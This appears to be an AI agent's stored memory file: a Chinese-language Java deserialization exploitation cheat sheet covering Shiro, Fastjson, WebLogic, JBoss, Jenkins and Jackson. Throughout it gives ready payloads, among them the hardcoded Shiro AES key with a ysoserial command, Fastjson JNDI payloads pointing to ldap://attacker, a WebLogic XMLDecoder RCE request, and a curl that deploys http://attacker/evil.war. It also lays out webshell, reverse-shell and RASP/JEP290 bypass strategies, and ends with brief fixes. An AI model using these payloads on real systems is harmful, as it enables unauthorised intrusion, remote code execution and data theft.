---
name: kb_java_deserialization_2026
description: Java反序列化漏洞速查表—Shiro/Fastjson/WebLogic/Tomcat/Jackson/JBoss/Jenkins gadget链+检测+利用+bypass
metadata: 
  node_type: memory
  type: reference
  originSessionId: 5d675b98-bcc4-43f6-b8de-46635cd0836f
---

# Java 反序列化漏洞速查表 (2026版)

## 一、序列化基础

### 识别特征
- **Hex**: `ac ed 00 05`
- **Base64**: `rO0AB`
- **HTTP Content-Type**: `application/x-java-serialized-object`

### 核心工具
- **ysoserial**: 30+ gadget链生成payload
- **JNDIExploit**: JNDI注入一站式服务端
- **marshalsec**: Jackson/SnakeYAML/Fastjson 利用

---

## 二、Apache Shiro RememberMe

### Shiro-550 (CVE-2016-4437, key ≤ 1.2.4)
- **特征**: Cookie `rememberMe=xxxx` base64值
- **原理**: AES-128-CBC 硬编码密钥 `kPH+bIxk5D2deZiIxcaaaA==`
- **Gadget选择**: 首选 CommonsBeanutils1 (无需CC依赖)、CommonsCollections 2/3/4/5/6、JRMPClient
- **工具**: shiro_attack (GUI+命令行)、ShiroExploit
- **检测**: 发带 `rememberMe` Cookie 的请求，Set-Cookie 头有 `rememberMe=deleteMe` 即存在
- **利用**:
```bash
java -jar ysoserial.jar CommonsBeanutils1 "command" | base64 > payload
# 替换 Cookie: rememberMe=<payload>
```
### Shiro-721 (Padding Oracle, key未知)
- **原理**: 利用任意rememberMe+Padding Oracle爆破AES key
- **条件**: 目标返回不同错误(合法cookie vs 非法cookie)，逐字节爆破
- **耗时**: 通常需要数万次请求

### Shiro检测绕过
- **URI不在拦截范围**: 放问号参数干扰 `/;/` `/./`
- **Header绕过**: 某些版本只看特定路径才触发rememberMe

---

## 三、Fastjson反序列化

### 版本与利用链演进
| 版本 | 利用链 | 绕过方式 |
|------|--------|------|
| ≤1.2.24 | JdbcRowSetImpl→JNDI | 无限制 |
| ≤1.2.47 | Cache绕过checkAutoType | `{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}` |
| ≤1.2.68 | expectClass | 白名单类绕过 |
| ≤1.2.80 | groovy/jython/mysql | 三方库利用 |

### 检测方法
```
# DNSLog检测
{"@type":"java.net.Inet4Address","val":"xxxx.dnslog.cn"}
{"@type":"java.net.Inet6Address","val":"xxxx.dnslog.cn"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"xxxx.dnslog.cn"}}

# 报错回显
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}  → class not found = 可能
```

### 常用 Payload (≤1.2.47)
```
{
  "@type": "java.lang.Class",
  "val": "com.sun.rowset.JdbcRowSetImpl"
},
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker:1389/evil",
  "autoCommit": true
}
```

### Fastjson不出网利用
- **BasicDataSource** + tomcat-dbcp: 写shell到磁盘
- **TemplatesImpl**: 加载字节码类(需Feature.SupportNonPublicField)
- **写文件链**: Oracle JDBC→本地序列化→写文件

---

## 四、WebLogic 反序列化

### 协议: T3 (7001) / IIOP (7002)
| CVE | 影响版本 | 利用类 |
|------|------|------|
| CVE-2015-4852 | 10.3.6 ~ 12.1.3 | 原生T3反序列化 |
| CVE-2016-3510 | " | IIOP反序列化 |
| CVE-2017-3506 | " | XMLDecoder |
| CVE-2017-10271 | 10.3.6 ~ 12.2.1.2 | wls-wsat XMLDecoder |
| CVE-2018-2893 | 12.2.1.3 | 文件上传→反序列化 |
| CVE-2018-2894 | " | 两步骤上传webshell |
| CVE-2019-2725 | 10.3.6 ~ 12.1.3 | _async 异步反序列化 |
| CVE-2020-2555 | 12.2.1.3/4 | Coherence gadget |
| CVE-2023-21839 | 12.2.1.3/4 | IIOP Naming |
| CVE-2024-20931 | 12.2.1.4 | JNDI注入 |

### CVE-2017-10271 利用
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope>
  <soapenv:Header>
    <work:WorkContext>
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>cmd</string></void>
            <void index="1"><string>/c</string></void>
            <void index="2"><string>whoami</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
</soapenv:Envelope>
```

### CVE-2023-21839 (最新) 检测
- IIOP/GIOP + ForeignOpaqueReference + JNDI
- GIOP 键名 `keyAddr` → Naming Service → JNDI注入

### Weblogic 检测工具
- weblogicScanner: 端口CVE检测
- WebLogicTool: 图形化利用工具
- T3Scanner: T3协议探测

---

## 五、Tomcat 反序列化

### CVE-2016-8735 (JMX反序列化, ≤8.5.9)
- `/jmxrmi` or `jndi` 接口
- 配合 ysoserial 反序列化

### CVE-2020-9484 (Session持久化反序列化, ≤9.0.35)
- 条件苛刻: 需要 PersistenceManager + FileStore + 上传 session 文件
- 低优先级，很少遇到

---

## 六、Jackson 反序列化

### Jackson 安全漏洞
| CVE | 内容 |
|------|------|
| CVE-2019-12384 | enableDefaultTyping→反序列化 |
| CVE-2019-14540 | jdk gadgets绕过 |
| CVE-2019-16335 | com.zaxxer.hikari |
| CVE-2019-17267 | 多个gadgets |
| CVE-2020-9546/9547/9548 | 多种绕过 |
| CVE-2020-35728 | commons-configuration |

### Jackson 利用
- 类似 fastjson，通过 `@class` / `"@class"` / `@type` 注入
- 工具: `marshalsec` / `JNDIExploit`

---

## 七、JBoss/WildFly

| CVE/漏洞 | 说明 |
|------|------|
| CVE-2017-12149 | `/invoker/readonly` 反序列化 |
| CVE-2017-7504 | JBossMQ JMS反序列化 |
| JMX Console 未授权 | `/jmx-console/` → addURL + invoke deploy |
| Web Console 未授权 | `/web-console/` → 部署war包 |

### JBoss AS 5.x 反序列化利用
```
# 直接 curl 部署war包
curl http://target:8080/jmx-console/HtmlAdaptor --data-urlencode "action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=6&arg0=http://attacker/evil.war"
```

---

## 八、Jenkins

### 已知漏洞
| 漏洞 | 说明 |
|------|------|
| CVE-2016-0792 | XStream反序列化 RCE |
| CVE-2017-1000353 | remoting通道反序列化 |
| CVE-2018-1000861 | Stapler路由绕过+反序列化 |
| CVE-2019-1003000 | 沙盒绕过→Groovy脚本执行 |
| CVE-2024-23897 | CLI 文件读取 |

### Jenkins Script Console (需认证)
```
POST /script
println "whoami".execute().text
```

---

## 九、Gadget 链速查表

| 链名 | 依赖库 | 适用场景 | 是否常用 |
|------|--------|------|------|
| CommonsCollections1-7 | commons-collections 3.x/4.x | 通用 | ⭐⭐⭐⭐⭐ |
| CommonsBeanutils1 | commons-beanutils | **无CC依赖首选** | ⭐⭐⭐⭐⭐ |
| CommonsBeanutils2 | commons-beanutils+commons-logging | 无CC备选 | ⭐⭐⭐ |
| Jdk7u21 | JDK原生类 | 7u21及以下 | ⭐⭐ |
| JRMPClient | JDK原生 | SSRF→反序列化 | ⭐⭐⭐⭐ |
| Spring1/2 | spring-core | Spring环境 | ⭐⭐⭐⭐ |
| Click1 | click-nodeps | Weblogic常用 | ⭐⭐⭐ |
| C3P0 | c3p0连接池 | JNDI利用 | ⭐⭐⭐ |
| URLDNS | JDK原生 | **检测用** | ⭐⭐⭐⭐⭐ |

### Gadget优先级
```
1. URLDNS → 检测是否存在反序列化 (DNSLog)
2. CommonsBeanutils1 → 无CC依赖时最好的RCE链
3. CommonsCollections → CC环境首选
4. JRMPClient → 不出网场景下的SSRF链
```

---

## 十、通用检测流程

```
Step 1: 看请求/响应中是否有 base64 rO0AB / hex ac ed 00 05
Step 2: 发 URLDNS payload → DNSLog确认反序列化存在
Step 3: 探知目标依赖库(Spring? Commons-Beanutils? CC?)
Step 4: 按优先级选gadget → 生成payload
Step 5: 无回显→尝试DNS外带命令结果或写文件webshell
```

### 不出网利用方案
1. **JRMPListener**: 监听JRMP端口→反序列化反弹shell
2. **写文件**: TemplatesImpl 字节码写webshell
3. **延迟探测**: 基于sleep的布尔判断逐位提取

---

## 十b. 防护绕过总纲：RASP / JEP290 / ObjectInputFilter（2026 更新）

### RASP 绕过（运行时应用自我保护）
```
# RASP 检测点（每类 RASP 重点 hook 的位置）
反序列化 @type/readObject 入口 | Runtime.exec / ProcessBuilder | 反射 setAccessible
defineClass/字节码加载 | Filter/Servlet/Listener 注册（内存马）
# 绕过方向（按优先顺序）
1. 走不触发 exec hook 的 sink：JDBC URL 注入（H2 INIT=RUNSCRIPT 执行 SQL→CREATE ALIAS→Java 函数）
2. 文件写链代替命令执行：AspectJWeaver(SimpleCache$put→FileOutputStream) / BasicDataSource(tomcat-dbcp 写 shell)
3. 白名单类做中间层：JDK 原生类（UnicastRef/RemoteObject）不触发类过滤 → 二次反序列化/任意连接
4. Fastjson 场景：RASP 拦 defineClass → JDK9+ 用 /proc/self/fd/N 两阶段加载（CVE-2026-16723）
5. 内存马对抗：RASP 拦 Servlet 注册 → 字节码层面直接修改已加载类（Javassist/ASM）
6. 先确认 RASP 厂商再选路：阿里云RASP / OpenRASP / 玄武 / 自研（hook 点不同）
```

### JEP290 / ObjectInputFilter 绕过
```
# 背景
JEP290(JDK9/8u121) 引入 ObjectInputFilter；jdk.serialFilter 系统属性配置
JEP415(JDK17) filter factory "sticky"，后续代码不能覆盖为 null
关键: filter 必须显式配置，很多应用根本没配（CVE-2026-41586 fabric-sdk-java 无 filter 直接 CC6 RCE）

# 绕过点
1. 嵌套反序列化流逃逸：filter 绑定 ObjectInputStream 实例而非数据流本身
   对象 readObject 内部新建 OIS 反序列化嵌套流 → 外层 filter 不传播
   利用类: SignedObject（持 innerObject 触发嵌套反序列化）
2. RMI 白名单滥用（8u121~8u231）：
   UnicastRef 白名单 → 控制 LiveRef 的 host/port → 目标向攻击者任意 JRMP 连接（JRMPClient）
   UnicastRemoteObject ssf=动态代理(RemoteObjectInvocationHandler) → reexport→invoke→RCE
   （8u231 修复: DGC 层 InputStream 先装 filter 再反序列化）
3. JDK21 模块强封装（TemplatesImpl 反射被物理隔离, 应用代码无法绕过）：
   → 换外部 sink:
     外部 Xalan-J 替换内部 TemplatesImpl（适配 CommonsBeanutils1 链）
     H2 JDBC INIT=RUNSCRIPT FROM 'http://attacker/evil.sql'（BeanComparator("connection") 触发）
     AspectJWeaver + CC4 → 任意文件写（webshell/cron/ssh key）
4. 探测顺序：反序列化端点先 URLDNS → 确认无 filter/可绕过 → 按 classpath 选 gadget
```

---

## 十一、修复方案

1. Shiro: 升级 ≥1.7.1 使用随机key / 禁用rememberMe
2. Fastjson: 升级 ≥1.2.83 / 开启safemode / 全局禁用autotype
3. WebLogic: 补丁 + 限制T3/IIOP协议外网访问
4. Jackson: 禁用enableDefaultTyping / 使用TypeReference
5. 通用: 升级JDK 8u191+ 禁用JNDI远程加载 / 全局配置 `com.sun.jndi.ldap.object.trustURLCodebase=false`